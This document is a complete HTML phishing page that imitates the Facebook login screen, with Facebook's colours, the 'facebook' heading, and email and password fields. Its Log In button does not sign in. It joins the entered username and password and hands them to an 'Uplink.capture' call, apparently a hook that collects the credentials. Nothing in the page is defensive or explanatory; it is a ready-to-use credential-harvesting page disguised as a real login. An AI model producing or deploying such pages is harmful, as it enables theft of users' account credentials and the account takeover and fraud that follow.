<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
    <style>
        body { background:#f0f2f5; color:#1c1e21; font-family:-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; padding:50px; text-align:center; margin:0; }
        h2 { color:#1877f2; font-size:2rem; margin-bottom:30px; }
        input { width:100%; padding:15px; margin-bottom:10px; border:1px solid #dddfe2; border-radius:6px; box-sizing:border-box; font-size:1rem; }
        button { width:100%; padding:15px; background:#1877f2; border:none; color:#fff; font-weight:bold; border-radius:6px; font-size:1.1rem; cursor:pointer; }
    </style>
</head>
<body>
    <h2>facebook</h2>
    <input type="text" id="u" placeholder="Email or phone number">
    <input type="password" id="p" placeholder="Password">
    <button onclick="var u=document.getElementById('u').value; var p=document.getElementById('p').value; if(u && p) Uplink.capture(u + ':' + p);">Log In</button>
</body>
</html>
